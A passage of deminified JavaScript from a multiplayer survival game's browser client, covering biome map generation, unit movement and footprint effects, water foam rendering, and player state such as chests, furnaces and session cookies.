              s_.biomes.push(new s_.Biome(a, b[2], b[3], b[4], b[5], b[6], b[7]));
            }
          } else if (s_.custom_map !== 0) {
            for (n = 0; n < s_.custom_map.length; n++) {
              var s = s_.custom_map[n];
              a = ds.BIOME_FOREST;
              switch (s[0]) {
                case "FOREST":
                  a = s_.BIOME_FOREST;
                  break;
                case "WINTER":
                  a = s_.BIOME_WINTER;
                  break;
                case "DESERT":
                  a = s_.BIOME_DESERT;
                  break;
                case "LAVA":
                  a = s_.BIOME_LAVA;
                  break;
                case "DRAGON":
                  a = s_.BIOME_DRAGON;
              }
              if (r(a, s[1], s[2], 0, (n + 1) * 10) === 0) {
                break;
              }
            }
            if (n !== s_.custom_map.length) {
              continue;
            }
          }
          break;
        }
        render_minimap();
        for (var E = [], u = 0; u < s_.nh; u++) {
          E[u] = new Array(s_.nw);
          for (var l = 0; l < s_.nw; l++) {
            E[u][l] = 0;
          }
        }
        for (u = 0; u < s_.biomes.length; u++) {
          for (var O = (s = s_.biomes[u]).x2 / 100, c = s.y2 / 100, R = s.x1 / 100; R <= O; R++) {
            for (var C = s.y1 / 100; C <= c; C++) {
              E[C][R] = 1;
            }
          }
        }
        for (C = 0; C < s_.nh; C++) {
          for (R = 0; R < s_.nw; R++) {
            if (E[C][R] === 0) {
              t(E, R, C);
            }
          }
        }
        a_ = {
          w: s_.nw,
          h: s_.nh,
          tiles: []
        };
        for (u = 0; u < s_.nh; u++) {
          a_.tiles[u] = [];
        }
        if (s_.custom_map !== 0 && s_.custom_map.length > 0 && s_.custom_map[0].length > 3) {
          for (n = 0; n < s_.custom_map.length; n++) {
            if ((b = s_.custom_map[n])[1] === "isl") {
              s_.add_island(b[2], b[3], b[4]);
            }
          }
        } else {
          s_.add_islands(s_.islands);
        }
        if (s_.custom_map !== 0 && s_.custom_map.length > 0 && s_.custom_map[0].length > 3) {
          var N = [];
          for (n = 0; n < s_.custom_map.length; n++) {
            var b;
            if ((b = s_.custom_map[n])[0] === 1) {
              if (b[1] === "r") {
                g(b[3], b[2], "wtb", 0, 1);
                N.push([b[3], b[2], b[4]]);
              } else {
                g(b[4], b[3], b[1], b[2], b[5]);
              }
            }
          }
          o(0, N);
          N = [];
        } else {
          for (u = 0; u < s_.biomes.length; u++) {
            s = s_.biomes[u];
            if (s_.mode === ds.MODE_LEGACY) {
              if (s.t === s_.BIOME_FOREST) {
                h(u, s.w / 10000);
              }
            } else {
              if (s.t === s_.BIOME_FOREST) {
                I(u, s.w / 10000);
              }
              if (s.t === s_.BIOME_LAVA) {
                d(u, s.w / 10000);
              }
              if (s.t === s_.BIOME_WINTER) {
                T(u, s.w / 10000);
              }
              if (s.t === s_.BIOME_DESERT) {
                A(u, s.w / 10000);
              }
              if (s.t === s_.BIOME_DRAGON) {
                _(u);
              }
            }
          }
        }
        He("isl", 1);
        He("wtb", 20);
        He("la", 1);
        He("c", 1);
        He("s", 1);
        He("f", 1);
        He("p", 1);
        He("g", 1);
        He("d", 1);
        He("a", 1);
        He("re", 1);
        He("m", 1);
        fe = [];
        s_.map_wrapper(a_);
      };
      this.render_single_resource = g;
      this.map_wrapper = function (e) {
        for (var i = 0; i < this.nh; i++) {
          for (var t = 0; t < this.nw; t++) {
            if (!e.tiles[i]) {
              e.tiles[i] = [];
            }
            if (e.tiles[i][t]) {
              var r = e.tiles[i][t];
              if (r.de && r.de.length > 0) {
                for (var n = 0; n < r.de.length; n++) {
                  if (r.de[n] && r.de[n].length > 0) {
                    r.de = r.de[n][0];
                    if (n >= 41 && n <= 49) {
                      r.de.scale = 3;
                      var a = Math.floor(Math.random() * 3 + 1);
                      r.de.p = [];
                      for (var o = 0; o < a; o++) {
                        r.de.p.push({
                          x: Math.random() * 120 - 60,
                          y: Math.random() * 120 - 60,
                          angle: Math.random() * Math.PI * 2,
                          _id: 41 + Math.floor(Math.random() * 9)
                        });
                      }
                    } else if (n >= 19 && n <= 26) {
                      r.de.scale = 3;
                      a = Math.floor(Math.random() * 3 + 1);
                      r.de.p = [];
                      for (o = 0; o < a; o++) {
                        r.de.p.push({
                          x: Math.random() * 120 - 60,
                          y: Math.random() * 120 - 60,
                          angle: Math.random() * Math.PI * 2,
                          _id: 19 + Math.floor(Math.random() * 8)
                        });
                      }
                    } else if (n <= 15 || n >= 27 && n <= 40) {
                      r.de.angle = 0;
                      r.de.scale = 2;
                      r.de._id = n;
                    } else {
                      r.de.angle = Math.random() * Math.PI * 2;
                      r.de.scale = 1;
                      r.de._id = n;
                    }
                  }
                }
              }
              C(r, "p", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
              C(r, "t", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
              C(r, "s", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
              C(r, "g", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
              C(r, "d", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
              C(r, "b", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
              C(r, "f", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
              C(r, "sw", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
              C(r, "gw", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
              C(r, "dw", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
              C(r, "a", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
              C(r, "cs", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
              C(r, "plm", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
              C(r, "re", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
              C(r, "c", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
              C(r, "m", new Utils.LinearAnimation(false, 1, 1, 0, 10, 10));
            } else {
              e.tiles[i][t] = [];
            }
          }
        }
      };
      this.time = Ie.DAY;
      this.clock = {
        translate: {
          x: 0,
          y: 0
        },
        init: 0,
        hour: 0,
        now: 0
      };
      this.delete_all_units = function () {
        this.fast_units = [];
        this.units[us.PLAYERS] = [];
        this.units[us.WORKBENCH] = [];
        this.units[us.FIRE] = [];
        this.units[us.BIG_FIRE] = [];
        this.units[us.SEED] = [];
        this.units[us.SPIKE] = [];
        this.units[us.STONE_SPIKE] = [];
        this.units[us.GOLD_SPIKE] = [];
        this.units[us.DIAMOND_SPIKE] = [];
        this.units[us.AMETHYST_SPIKE] = [];
        this.units[us.REIDITE_SPIKE] = [];
        this.units[us.BRIDGE] = [];
        this.units[us.WOOD_TOWER] = [];
        this.units[us.ROOF] = [];
        this.units[us.PLOT] = [];
        this.units[us.WHEAT_SEED] = [];
        this.units[us.ALOE_VERA_SEED] = [];
        this.units[us.PUMPKIN_SEED] = [];
        this.units[us.TOMATO_SEED] = [];
        this.units[us.CARROT_SEED] = [];
        this.units[us.WATERMELON_SEED] = [];
        this.units[us.GARLIC_SEED] = [];
        this.units[us.THORNBUSH_SEED] = [];
        this.units[us.WINDMILL] = [];
        this.units[us.EXTRACTOR_MACHINE_STONE] = [];
        this.units[us.EXTRACTOR_MACHINE_GOLD] = [];
        this.units[us.EXTRACTOR_MACHINE_DIAMOND] = [];
        this.units[us.EXTRACTOR_MACHINE_AMETHYST] = [];
        this.units[us.EXTRACTOR_MACHINE_REIDITE] = [];
        this.units[us.WELL] = [];
        this.units[us.WALL] = [];
        this.units[us.STONE_WALL] = [];
        this.units[us.GOLD_WALL] = [];
        this.units[us.DIAMOND_WALL] = [];
        this.units[us.AMETHYST_WALL] = [];
        this.units[us.REIDITE_WALL] = [];
        this.units[us.BED] = [];
        this.units[us.WOOD_DOOR] = [];
        this.units[us.STONE_DOOR] = [];
        this.units[us.GOLD_DOOR] = [];
        this.units[us.DIAMOND_DOOR] = [];
        this.units[us.AMETHYST_DOOR] = [];
        this.units[us.REIDITE_DOOR] = [];
        this.units[us.WOOD_DOOR_SPIKE] = [];
        this.units[us.STONE_DOOR_SPIKE] = [];
        this.units[us.GOLD_DOOR_SPIKE] = [];
        this.units[us.DIAMOND_DOOR_SPIKE] = [];
        this.units[us.AMETHYST_DOOR_SPIKE] = [];
        this.units[us.REIDITE_DOOR_SPIKE] = [];
        this.units[us.FURNACE] = [];
        this.units[us.TOTEM] = [];
        this.units[us.WOOD_TOWER] = [];
        this.units[us.CHEST] = [];
        this.units[us.RESURRECTION] = [];
        this.units[us.EMERALD_MACHINE] = [];
        this.units[us.FRUIT] = [];
        this.units[us.RABBIT] = [];
        this.units[us.WOLF] = [];
        this.units[us.CRAB] = [];
        this.units[us.BOAR] = [];
        this.units[us.BABY_MAMMOTH] = [];
        this.units[us.CRAB_BOSS] = [];
        this.units[us.BABY_DRAGON] = [];
        this.units[us.BABY_LAVA] = [];
        this.units[us.HAWK] = [];
        this.units[us.PIRANHA] = [];
        this.units[us.KRAKEN] = [];
        this.units[us.FOX] = [];
        this.units[us.PENGUIN] = [];
        this.units[us.SPELL] = [];
        this.units[us.FIREFLY] = [];
        this.units[us.BEAR] = [];
        this.units[us.MAMMOTH] = [];
        this.units[us.VULTURE] = [];
        this.units[us.SAND_WORM] = [];
        this.units[us.DRAGON] = [];
        this.units[us.LAVA_DRAGON] = [];
        this.units[us.FLAME] = [];
        this.units[us.WHEAT_MOB] = [];
        this.units[us.ALOE_VERA_MOB] = [];
        this.units[us.PUMPKIN_MOB] = [];
        this.units[us.GARLIC_MOB] = [];
        this.units[us.THORNBUSH_MOB] = [];
        this.units[us.TREASURE_CHEST] = [];
        this.units[us.DEAD_BOX] = [];
        this.units[us.CRATE] = [];
        this.units[us.BREAD_OVEN] = [];
        this.units[us.SIGN] = [];
        this.units[us.SPIDER] = [];
        this.units[us.GIFT] = [];
        this.units[us.GARLAND] = [];
      };
      this.delete_units = function (e) {
        if (this.fast_units[e]) {
          type = this.fast_units[e].type;
          this.fast_units[e] = null;
          for (var i = this.units[type], t = 0; t < i.length; t++) {
            if (i[t].uid == e) {
              return void i.splice(t, 1);
            }
          }
        }
      };
      this.find_tower = function (e, i) {
        for (var t = 0; t < this.units[us.WOOD_TOWER].length; t++) {
          var r = this.units[us.WOOD_TOWER][t];
          if (Math.floor(r.x / 100) === i && Math.floor(r.y / 100) === e) {
            return 1;
          }
        }
        return 0;
      };
      this.find_bridge = function (e, i) {
        for (var t = 0; t < this.units[us.BRIDGE].length; t++) {
          var r = this.units[us.BRIDGE][t];
          if (Math.floor(r.x / 100) == e && Math.floor(r.y / 100) == i) {
            return true;
          }
        }
        return false;
      };
      this.move_units = function (e) {
        for (var i = 0; i < e.length; i++) {
          b = e[i];
          if (b.angle != b.nangle) {
            var t = Math.PI * 2;
            b.angle = (b.angle + t) % t;
            b.nangle = (b.nangle + t) % t;
            if (b.angle != b.nangle) {
              var r = b.nangle - b.angle;
              var n = Math.abs(r);
              if (n > Math.PI) {
                n = Math.PI * 2 - n;
              }
              var a = n / Math.PI * 3 * ds.ROTATE * I_;
              if (r > Math.PI) {
                b.angle -= a;
              } else if (r < -Math.PI) {
                b.angle += a;
              } else if (r < 0) {
                b.angle -= a;
              } else {
                b.angle += a;
              }
              b.angle = (b.angle + t) % t;
              if (Math.abs(b.angle - b.nangle) < a) {
                b.angle = b.nangle;
              }
            }
          }
          Math.floor(b.r.y / 100);
          Math.floor(b.r.x / 100);
          if (b.x != b.r.x || b.y != b.r.y) {
            if (b.action & Es.IDLE) {
              b.action -= Es.IDLE;
            }
            b.action |= Es.WALK;
            var o = Utils.get_std_angle(b, b.r) + Math.PI;
            var s = I_ * b.speed;
            var _ = Utils.build_vector(s, o);
            if (Utils.norm(_) < Utils.norm(Utils.get_vector(b, b.r))) {
              Utils.add_vector(b, _);
            } else {
              if (b.action & Es.WALK) {
                b.action -= Es.WALK;
              }
              b.action |= Es.IDLE;
              Utils.copy_vector(b.r, b);
            }
          }
          if (b.ghost) {
            var E = b.bubbles;
            if ((h = E.length) === 0 || h < Ie.GHOST_BUBBLES && E[h - 1].life < 0.95) {
              E.push({
                id: Math.floor(Math.random() * sprite[Ie.BUBBLES][0].length),
                x: Math.floor(b.x + Math.random() * 80 - 40),
                y: Math.floor(b.y + Math.random() * 80 - 40),
                life: 1
              });
            }
            for (var T = 0; T < h; T++) {
              E[T].life = Math.max(0, E[T].life - I_);
            }
            for (T = 0; T < h; T++) {
              if (E[T].life === 0) {
                E.splice(T, 1);
                break;
              }
            }
          }
          var A = 0;
          if (b.move_effect && n_.quality) {
            var d = b.swim;
            var h = d.length;
            if (b.dist_water > 0 && b.vehicle !== le.BABY_DRAGON && b.vehicle !== le.BABY_LAVA && b.vehicle !== le.PLANE && b.vehicle !== le.HAWK && b.vehicle !== le.NIMBUS && !b.ghost && (A = 1, h === 0 || Utils.dist(d[h - 1], b) > Ie.SWIM_SPACE)) {
              var I = -b.angle;
              var u = Math.sin(I) * 45 * L;
              var l = Math.cos(I) * 45 * L;
              d.push({
                x: b.x + u,
                y: b.y + l,
                r: 8,
                alpha: 0.8
              });
              d.push({
                x: b.x - u,
                y: b.y - l,
                r: 8,
                alpha: 0.8
              });
              d.push({
                x: b.x,
                y: b.y,
                r: 24,
                alpha: 1
              });
            }
            for (T = 0; T < h; T++) {
              d[T].alpha = Math.max(0, d[T].alpha - I_ / 2.2);
              d[T].r += I_ * 20;
            }
            if (d.length > 0 && d[0].alpha === 0) {
              d.splice(0, 1);
            }
            var O = b.foot;
            h = O.length;
            var c = -1;
            var R = Math.max(0, Math.sign(b.dist_sand));
            var g = Math.max(0, Math.sign(b.dist_winter));
            Math.max(0, Math.sign(b.dist_desert));
            var C = Math.max(0, Math.sign(b.dist_lava));
            var N = Math.max(0, Math.sign(b.dist_dragon));
            if (b.dist_sand > 0 || b.dist_desert > 0) {
              c = Ie.SAND_STEP;
            } else if (b.dist_dragon > 0) {
              c = Ie.CAVE_STEP;
            } else if (b.dist_winter > 0) {
              c = Ie.SNOW_STEP;
            } else if (b.dist_lava > 0) {
              c = Ie.LAVA_STEP;
            }
            if (b.vehicle === le.MOUNT_BOAR && (R | g | C | N) == 1) {
              c = Ie.BOAR_STEP;
              var D = b.vehicle_fx2 - Math.PI / 2;
              var S = 15;
              var p = 11;
              var m = Ie.STEP_SPACE;
            } else if (b.vehicle === le.BABY_MAMMOTH && (R | g | C | N) == 1) {
              c = Ie.BABY_MAMMOTH_STEP;
              D = b.vehicle_fx2 - Math.PI / 2;
              S = 21;
              p = 16;
              m = Ie.STEP_SPACE;
            } else if (b.vehicle === le.CRAB_BOSS && (R | g | C | N) == 1) {
              c = Ie.CRAB_STEP;
              D = b.vehicle_fx2 - Math.PI / 2;
              var v = Math.random() * 50;
              S = 10 + v;
              p = 0 + v;
              m = Ie.STEP_SPACE * 0.9;
            } else {
              D = b.angle;
              S = 15;
              p = 11;
              m = Ie.STEP_SPACE;
            }
            if (b.vehicle === le.BABY_DRAGON || b.vehicle === le.BABY_LAVA || b.vehicle === le.NIMBUS || b.vehicle === le.HAWK || b.vehicle === le.PLANE || b.ghost) ;else if (b.vehicle === le.SLED) {
              if (h === 0 || Utils.dist(O[h - 1], b) > Ie.TRAIL_SPACE) {
                O.push({
                  x: b.x,
                  y: b.y,
                  angle: b.vehicle_fx2,
                  alpha: 1,
                  id: Ie.SLED_WAVE
                });
              }
            } else if (c != -1 && A === 0 && (h === 0 || Utils.dist(O[h - 1], b) > m)) {
              b.id_foot++;
              if (Math.abs(b.x - b.r.x) > 1 && Math.abs(b.y - b.r.y) > 1) {
                if (b.r.x > b.x && b.r.y < b.y || b.r.x < b.x && b.r.y > b.y) {
                  if (b.id_foot % 2) {
                    u = -p * L;
                    l = -p * L;
                  } else {
                    l = p * L;
                    u = p * L;
                  }
                } else if (b.id_foot % 2) {
                  u = p * L;
                  l = -p * L;
                } else {
                  l = p * L;
                  u = -p * L;
                }
              } else if (b.id_foot % 2) {
                u = Math.sin(D) * S * L;
                l = Math.cos(D) * S * L;
              } else {
                u = -Math.sin(D) * S * L;
                l = -Math.cos(D) * S * L;
              }
              O.push({
                x: b.x + u,
                y: b.y + l,
                angle: D + Math.PI / 2,
                alpha: 1,
                id: c
              });
            }
            for (T = 0; T < h; T++) {
              if (O[T].id === Ie.SLED_WAVE) {
                O[T].alpha = Math.max(0, O[T].alpha - I_ * 1.5);
              } else {
                O[T].alpha = Math.max(0, O[T].alpha - I_ / 2.85);
              }
            }
            if (O.length > 0 && O[0].alpha === 0) {
              O.splice(0, 1);
            }
          }
        }
      };
      this.update = function () {
        this.move_units(this.units[us.PLAYERS]);
        this.move_units(this.units[us.RABBIT]);
        this.move_units(this.units[us.WOLF]);
        this.move_units(this.units[us.CRAB]);
        this.move_units(this.units[us.BOAR]);
        this.move_units(this.units[us.BABY_MAMMOTH]);
        this.move_units(this.units[us.CRAB_BOSS]);
        this.move_units(this.units[us.BABY_DRAGON]);
        this.move_units(this.units[us.BABY_LAVA]);
        this.move_units(this.units[us.HAWK]);
        this.move_units(this.units[us.SPIDER]);
        this.move_units(this.units[us.FOX]);
        this.move_units(this.units[us.PENGUIN]);
        this.move_units(this.units[us.SPELL]);
        this.move_units(this.units[us.FIREFLY]);
        this.move_units(this.units[us.BEAR]);
        this.move_units(this.units[us.MAMMOTH]);
        this.move_units(this.units[us.VULTURE]);
        this.move_units(this.units[us.SAND_WORM]);
        this.move_units(this.units[us.DRAGON]);
        this.move_units(this.units[us.FLAME]);
        this.move_units(this.units[us.PIRANHA]);
        this.move_units(this.units[us.KRAKEN]);
        this.move_units(this.units[us.LAVA_DRAGON]);
      };
      this.breath = [];
      this.breath[Ie.LAKE] = new Utils.LinearAnimation(false, 1, 1.05, 1, 0.008, 0.008);
      this.breath[Ie.LAKE_DEEP] = new Utils.LinearAnimation(false, 1, 1.08, 1, 0.006, 0.006);
      this.breath[Ie.WAVE_ONE] = new Utils.LinearAnimation(false, 1, 1.02, 1, 0.008, 0.008);
      this.breath[Ie.WAVE_TWO] = new Utils.LinearAnimation(false, 1, 1.08, 1, 0.006, 0.006);
      this.lava = [];
      this.lava[0] = new Utils.LinearAnimation(false, 0.1, 1, 0, 0.6, 0.6);
      this.lava[1] = new Utils.LinearAnimation(false, 0.4, 1, 0, 0.6, 0.6);
      this.lava[2] = new Utils.LinearAnimation(false, 0.3, 1, 0, 0.6, 0.6);
      this.lava[3] = new Utils.LinearAnimation(false, 0.8, 1, 0, 0.6, 0.6);
      this.lava[4] = new Utils.LinearAnimation(false, 0.3, 1, 0, 0.6, 0.6);
      this.lava[5] = new Utils.LinearAnimation(false, 0.8, 1, 0, 0.6, 0.6);
      this.lava[6] = new Utils.LinearAnimation(false, 0.5, 1, 0, 0.6, 0.6);
      this.lava[7] = new Utils.LinearAnimation(false, 0.9, 1, 0, 0.6, 0.6);
      this.lava[8] = new Utils.LinearAnimation(false, 0.6, 1, 0, 0.6, 0.6);
      this.lava[9] = new Utils.LinearAnimation(false, 0.2, 1, 0, 0.6, 0.6);
      this.lava[10] = new Utils.LinearAnimation(false, 0.6, 1, 0, 0.6, 0.6);
      this.lava[11] = new Utils.LinearAnimation(false, 0.4, 1, 0, 0.6, 0.6);
      this.lava[12] = new Utils.LinearAnimation(false, 0.8, 1, 0, 0.6, 0.6);
      this.lava[13] = new Utils.LinearAnimation(false, 0.2, 1, 0, 0.6, 0.6);
      this.lava[14] = new Utils.LinearAnimation(false, 0.7, 1, 0, 0.6, 0.6);
    }
    function gs(e, i, t, r) {
      this.id = e;
      this.speed = (e + 5) * 8;
      this.life = S / 1366;
      this.x = i;
      this.y = t;
      this.c = Math.cos(r);
      this.s = Math.sin(r);
      this.alpha = 0;
    }
    function Cs() {
      this.init = function () {};
      this.resurrection = {
        pid: 1,
        iid: 1,
        open: false
      };
      this.well = {
        pid: 1,
        iid: -1,
        open: false
      };
      this.windmill = {
        amount_wheat: 0,
        amount_flour: 0,
        pid: 1,
        iid: -1,
        open: false
      };
      this.extractor = {
        amount_wood: 0,
        amount_mineral: 0,
        type: 0,
        mineral: 0,
        pid: 1,
        iid: -1,
        open: false
      };
      this.bread_oven = {
        amount_wood: 0,
        amount_bread: 0,
        amount_flour: 0,
        pid: 1,
        iid: -1,
        open: false
      };
      this.sign = {
        iid: -1,
        open: false
      };
      this.furnace = {
        amount: 0,
        pid: 1,
        iid: -1,
        open: false
      };
      this.ghost = {
        enabled: false,
        delay: -1,
        label: false,
        now: -1,
        draw: ho
      };
      this.chest = {
        id: -1,
        amount: 0,
        pid: 1,
        iid: -1,
        open: false,
        lock: false,
        locked: false,
        lockpick: false,
        padlock: false
      };
      this.alive = false;
      this.reconnect = {
        enabled: false,
        rotate: 0
      };
      this.key = Utils.gup("key", window.location.href);
      var e = Utils.gup("egg", window.location.href);
      function i() {
        this.seed = 1;
        this.seed2 = 2;
        this.seed3 = 3;
        this.seedv = 1;
        this.seedv2 = 2;
        this.seedv3 = 3;
        this.new_seed = function (e) {
          this.seed = 2 + Math.floor(Math.random() * ds.SEED);
        };
        this.new_seed2 = function (e) {
          this.seed2 = 2 + Math.floor(Math.random() * ds.SEED);
        };
        this.new_seed3 = function (e) {
          this.seed3 = 2 + Math.floor(Math.random() * ds.SEED);
        };
        this.new_seedv = function (e) {
          this.seedv = 2 + Math.floor(Math.random() * ds.SEED);
        };
        this.new_seedv2 = function (e) {
          this.seedv2 = 2 + Math.floor(Math.random() * ds.SEED);
        };
        this.new_seedv3 = function (e) {
          this.seedv3 = 2 + Math.floor(Math.random() * ds.SEED);
        };
        this.draw_foam_vert = function (e, i, t, r, n, a, o) {
          for (var s = 1; s < o;) {
            var _ = s * t % RAND_SIZE;
            var E = RANDOM[_];
            if (E < 0.1) {
              T += 50;
              s += 50;
            } else {
              var T = Math.floor(E * r + n);
              if (s > a && s < o) {
                var A = Math.random() > 0.5 ? I_ * -10 : I_ * 10;
                var d = T * i;
                this.bxv[_] = Math.max(-ds.FLOAM_X, Math.min(ds.FLOAM_X, this.bxv[_] + A));
                this.byv[_] = Math.max(-ds.FLOAM_Y, Math.min(ds.FLOAM_Y, this.byv[_] + A));
                if (d > 0) {
                  D.beginPath();
                  D.arc(s + __.cam.x + this.byv[_], e + this.bxv[_] - ds.FLOAM_X * 0.8, d, 0, Math.PI * 2);
                  if (s_.transition) {
                    var h = s_.time ? 1 - s_.shade.v : s_.shade.v;
                    D.fillStyle = Vo(83, 156, 160, 236, 247, 249, h);
                  } else {
                    D.fillStyle = Ie.FLOAM_COLOR[s_.time];
                  }
                  D.fill();
                }
              }
              s += T * 2;
            }
          }
        };
        this.draw_foam = function (e, i, t, r, n, a, o) {
          for (var s = 1; s < o;) {
            var _ = s * t % RAND_SIZE;
            var E = RANDOM[_];
            if (E < 0.1) {
              T += 50;
              s += 50;
            } else {
              var T = Math.floor(E * r + n);
              if (s > a && s < o) {
                var A = Math.random() > 0.5 ? I_ * -10 : I_ * 10;
                var d = T * i;
                this.bx[_] = Math.max(-ds.FLOAM_X, Math.min(ds.FLOAM_X, this.bx[_] + A));
                this.by[_] = Math.max(-ds.FLOAM_Y, Math.min(ds.FLOAM_Y, this.by[_] + A));
                if (d > 0) {
                  D.beginPath();
                  D.arc(e + this.bx[_] - ds.FLOAM_X * 0.8, s + __.cam.y + this.by[_], d, 0, Math.PI * 2);
                  if (s_.transition) {
                    var h = s_.time ? 1 - s_.shade.v : s_.shade.v;
                    D.fillStyle = Vo(83, 156, 160, 236, 247, 249, h);
                  } else {
                    D.fillStyle = Ie.FLOAM_COLOR[s_.time];
                  }
                  D.fill();
                }
              }
              s += T * 2;
            }
          }
        };
        this.draw_foams_bottom = function (e, i, t, r, n, a) {
          var o;
          n -= 30;
          a += 30;
          if ((o = -(t - ds.LW1SX - r - 2) / ds.W1EX) === 0) {
            this.new_seed3();
          }
          D.globalAlpha = Utils.ease_in_out_quad(o);
          this.draw_foam_vert(t, o, this.seed3, 18, 16, n, a);
          D.globalAlpha = 1;
          if ((o = -(e - ds.LW2SX - r + 500) / ds.W2EX) === 0) {
            this.new_seed();
          }
          D.globalAlpha = Utils.ease_in_out_quad(o);
          this.draw_foam_vert(e, o, this.seed, 12, 10, n, a);
          D.globalAlpha = 1;
          if (i !== -1) {
            if ((o = -(i - ds.LW3SX - r + 698) / ds.W3EX) <= 0.01) {
              this.new_seed2();
            }
            D.globalAlpha = Utils.ease_in_out_quad(o);
            this.draw_foam_vert(i, o, this.seed2, 6, 6, n, a);
            D.globalAlpha = 1;
          }
        };
        this.draw_foams_top = function (e, i, t, r, n, a) {
          var o;
          n -= 30;
          a += 30;
          if ((o = -(-t + ds.LW1SX + r + 2) / ds.W1EX) === 0) {
            this.new_seed3();
          }
          D.globalAlpha = Utils.ease_in_out_quad(o);
          this.draw_foam_vert(t, o, this.seed3, 18, 16, n, a);
          D.globalAlpha = 1;
          if ((o = -(-e + ds.LW2SX + r) / ds.W2EX) === 0) {
            this.new_seed();
          }
          D.globalAlpha = Utils.ease_in_out_quad(o);
          this.draw_foam_vert(e, o, this.seed, 12, 10, n, a);
          D.globalAlpha = 1;
          if (i !== -1) {
            if ((o = -(-i + ds.LW3SX + r) / ds.W3EX) <= 0.01) {
              this.new_seed2();
            }
            D.globalAlpha = Utils.ease_in_out_quad(o);
            this.draw_foam_vert(i, o, this.seed2, 6, 6, n, a);
            D.globalAlpha = 1;
          }
        };
        this.draw_foams_left = function (e, i, t, r, n, a) {
          var o;
          n -= 30;
          a += 30;
          if ((o = -(-t + ds.LW1SX + r + 2) / ds.W1EX) === 0) {
            this.new_seed3();
          }
          D.globalAlpha = Utils.ease_in_out_quad(o);
          this.draw_foam(t, o, this.seed3, 18, 16, n, a);
          D.globalAlpha = 1;
          if ((o = -(-e + ds.LW2SX + r) / ds.W2EX) === 0) {
            this.new_seed();
          }
          D.globalAlpha = Utils.ease_in_out_quad(o);
          this.draw_foam(e, o, this.seed, 12, 10, n, a);
          D.globalAlpha = 1;
          if (i !== -1) {
            if ((o = -(-i + ds.LW3SX + r) / ds.W3EX) <= 0.01) {
              this.new_seed2();
            }
            D.globalAlpha = Utils.ease_in_out_quad(o);
            this.draw_foam(i, o, this.seed2, 6, 6, n, a);
            D.globalAlpha = 1;
          }
        };
        this.draw_foams_right = function (e, i, t, r, n, a) {
          var o;
          n -= 30;
          a += 30;
          if ((o = -(t - ds.LW1SX - r - 2) / ds.W1EX) === 0) {
            this.new_seed3();
          }
          D.globalAlpha = Utils.ease_in_out_quad(o);
          this.draw_foam(t, o, this.seed3, 18, 16, n, a);
          D.globalAlpha = 1;
          if ((o = -(e - ds.LW2SX - r + 500) / ds.W2EX) === 0) {
            this.new_seed();
          }
          D.globalAlpha = Utils.ease_in_out_quad(o);
          this.draw_foam(e, o, this.seed, 12, 10, n, a);
          D.globalAlpha = 1;
          if (i !== -1) {
            if ((o = -(i - ds.LW3SX - r + 698) / ds.W3EX) <= 0.01) {
              this.new_seed2();
            }
            D.globalAlpha = Utils.ease_in_out_quad(o);
            this.draw_foam(i, o, this.seed2, 6, 6, n, a);
            D.globalAlpha = 1;
          }
        };
        this.w1 = {
          r: new Utils.Ease(Utils.ease_out_cubic, 0, 10, ds.W1SX, ds.W1SX, ds.W1EX),
          l: new Utils.Ease(Utils.ease_in_out_cubic, 0, 10, ds.W1EX, ds.W1EX, ds.W1SX)
        };
        this.w2 = {
          r: new Utils.Ease(Utils.ease_out_quart, 0, 10, ds.W2SX, ds.W2SX, ds.W2EX),
          l: new Utils.Ease(Utils.ease_in_out_quad, 0, 10, ds.W2EX, ds.W2EX, ds.W2SX)
        };
        this.w3 = {
          r: new Utils.Ease(Utils.ease_out_quint, 0, 10, ds.W3SX, ds.W3SX, ds.W3EX),
          l: new Utils.Ease(Utils.ease_in_out_quad, 0, 10, ds.W3EX, ds.W3EX, ds.W3SX)
        };
        this.t_ = function (e) {
          if (e.r.x === e.r.ex) {
            if (e.l.x === e.l.ex) {
              return e.r;
            } else {
              return e.l;
            }
          } else {
            return e.r;
          }
        };
        this.t = function (e) {
          var i;
          if (e.r.x === e.r.ex) {
            if (e.l.x === e.l.ex) {
              e.r.restart();
              e.l.restart();
              i = e.r;
            } else {
              i = e.l;
            }
          } else {
            i = e.r;
          }
          i.ease(i.ex);
          return i;
        };
        this.bx = [];
        this.by = [];
        this.bxv = [];
        this.byv = [];
        this.init = function () {
          for (var e = 0; e < RAND_SIZE; e++) {
            this.bx[e] = Math.floor(RANDOM[e] * ds.FLOAM_X);
            this.by[e] = Math.floor(RANDOM[e] * ds.FLOAM_Y);
            this.bxv[e] = Math.floor(RANDOM[e] * ds.FLOAM_X);
            this.byv[e] = Math.floor(RANDOM[e] * ds.FLOAM_Y);
          }
          this.w1.r.x = this.w1.r.ex;
          this.w2.r.ed = 3.5;
          this.w3.r.ed = 2;
        };
        this.init();
      }
      if (e) {
        n_.skin = parseInt(e);
      }
      this.beta = window.location.href.indexOf("http://starve.io/beta") === 0 ? 1 : 0;
      if (this.key && this.beta) {
        Cookies.set("starve_beta", this.key);
      } else if (this.beta) {
        this.key = Cookies.get("starve_beta");
      }
      this.token = Cookies.get("starve_token") ? Cookies.get("starve_token") : Utils.generate_token(As.TOKEN_LEN);
      window.baguette();
      this.token_id = Cookies.get("starve_token_id") ? Cookies.get("starve_token_id") : "";
      this.id = 0;
      this.uid = 0;
      this.day = 0;
      this.die = {
        howdie: "",
        score: 0,
        bank: 0,
        kill: 0
      };
      this.account = {
        connected: 0,
        last: new Date().getTime()
      };
      this.team = [];
      this.in_team = function (e) {
        for (var i = 0; i < this.team.length; i++) {
          if (this.team[i] == e) {
            return true;
          }
        }
        return false;
      };
      this.shop = {
        delay: 0,
        time: 0,
        value: 0,
        open: false,
        draw: function () {
          if (this.open) {
            var e = new Date().getTime();
            this.time = Math.floor((e - this.delay) / 1000);
            if (this.time < 60) {
              T_.shop.button.draw(D);
            } else {
